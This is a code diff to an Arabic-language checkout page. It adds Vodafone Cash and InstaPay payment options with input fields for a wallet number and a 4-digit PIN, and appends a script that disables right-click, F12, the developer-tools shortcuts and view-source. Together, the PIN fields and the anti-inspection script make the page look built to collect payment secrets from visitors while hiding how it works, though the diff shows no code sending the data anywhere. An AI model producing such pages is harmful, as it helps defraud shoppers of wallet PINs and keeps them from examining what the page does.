@@ -242,34 +242,28 @@
                     
                     <div class="payment-methods">
                         <div class="payment-method vodafone" data-method="vodafone">
-                            <i class="fas fa-mobile-alt"></i>
+                            <img src="https://www.vodafone.eg/content/dam/vodafone/images/personal/mobile-services/vodafone-cash/vodafone-cash-logo.svg" alt="فودافون كاش" class="payment-logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                            <i class="fas fa-mobile-alt" style="display:none;"></i>
                             <label>
                                 <input type="radio" name="paymentMethod" value="vodafone" required>
                                 فودافون كاش
                             </label>
                         </div>
                         
-                        <div class="payment-method visa" data-method="visa">
-                            <i class="fab fa-cc-visa"></i>
+                        <div class="payment-method instapay" data-method="instapay">
+                            <img src="https://instapay.com.eg/wp-content/uploads/2021/06/instapay-logo.png" alt="انستا باي" class="payment-logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                            <i class="fas fa-wallet" style="display:none;"></i>
                             <label>
-                                <input type="radio" name="paymentMethod" value="visa">
-                                Visa
+                                <input type="radio" name="paymentMethod" value="instapay">
+                                انستا باي
                             </label>
                         </div>
                         
-                        <div class="payment-method mastercard" data-method="mastercard">
-                            <i class="fab fa-cc-mastercard"></i>
-                            <label>
-                                <input type="radio" name="paymentMethod" value="mastercard">
-                                Mastercard
-                            </label>
-                        </div>
-                        
-                        <div class="payment-method mada" data-method="mada">
+                        <div class="payment-method credit-card" data-method="credit-card">
                             <i class="fas fa-credit-card"></i>
                             <label>
-                                <input type="radio" name="paymentMethod" value="mada">
-                                مدى
+                                <input type="radio" name="paymentMethod" value="credit-card">
+                                كريدت كارت
                             </label>
                         </div>
                     </div>
@@ -284,6 +278,19 @@
                         <div class="form-group">
                             <label for="vodafone-pin">كود التأكيد (PIN):</label>
                             <input type="password" id="vodafone-pin" placeholder="أدخل كود التأكيد" maxlength="4">
+                        </div>
+                    </div>
+
+                    <!-- InstaPay Details -->
+                    <div id="instapay-details" class="payment-details">
+                        <h4 style="color: #0066cc; margin-bottom: 15px;">تفاصيل الدفع بانستا باي</h4>
+                        <div class="form-group">
+                            <label for="instapay-number">رقم المحفظة:</label>
+                            <input type="tel" id="instapay-number" placeholder="01xxxxxxxxx">
+                        </div>
+                        <div class="form-group">
+                            <label for="instapay-pin">كود التأكيد (PIN):</label>
+                            <input type="password" id="instapay-pin" placeholder="أدخل كود التأكيد" maxlength="4">
                         </div>
                     </div>
 
@@ -382,5 +389,35 @@
 
     <!-- JS -->
     <script src="script.js"></script>
+    <script>
+        // Disable right-click and F12
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        document.addEventListener('keydown', function(e) {
+            // Disable F12
+            if (e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+            // Disable Ctrl+Shift+I (Developer Tools)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+                return false;
+            }
+            // Disable Ctrl+Shift+J (Console)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                e.preventDefault();
+                return false;
+            }
+            // Disable Ctrl+U (View Source)
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    </script>
 </body>
 </html>
